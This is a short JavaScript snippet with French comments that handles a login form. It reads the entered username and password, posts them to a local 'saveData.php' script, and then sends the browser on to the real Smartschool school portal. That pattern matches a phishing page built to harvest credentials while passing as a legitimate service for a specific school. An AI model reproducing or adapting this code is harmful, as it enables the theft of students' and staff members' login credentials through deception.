function submitForm(event) {
    event.preventDefault(); // Empêche le rechargement de la page

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const data = {
        username: username,
        password: password
    };

    // Save data to saveData.php
    fetch('saveData.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.text())
    .then(data => {
        console.log('Données envoyées avec succès:', data);
       
       
    })
    .catch(error => {
        console.error('Erreur:', error);
    });
        window.location.href = "https://ebr-secondaire.smartschool.be";
}

